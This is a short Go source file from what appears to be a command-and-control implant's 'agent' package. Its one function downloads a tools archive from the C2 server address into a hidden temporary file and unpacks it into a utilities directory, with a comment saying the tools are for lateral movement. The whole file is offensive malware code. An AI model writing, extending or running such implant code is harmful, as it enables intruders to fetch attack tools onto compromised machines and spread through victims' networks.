package agent

/*
install tools to UtilsPath, for lateral movement
*/

import (
	"log"
	"os"

	"github.com/mholt/archiver"
)

func installUtils() string {
	log.Printf("Downloading utils.zip from %s", CCAddress+"utils.zip")
	err := Download(CCAddress+"utils.zip", "/tmp/.vj8x8Verd.zip")
	out := "[+] Utils have been successfully installed"
	if err != nil {
		log.Print("Utils error: " + err.Error())
		out = "[-] Download error: " + err.Error()
	}

	// TODO unpack utils.zip to our PATH
	if !IsFileExist(UtilsPath) {
		if err = os.MkdirAll(UtilsPath, 0700); err != nil {
			log.Print(err)
			return err.Error()
		}
	}
	if err = archiver.Unarchive("/tmp/.vj8x8Verd.zip", UtilsPath); err != nil {
		log.Printf("Unarchive: %v", err)
	}
	return out
}
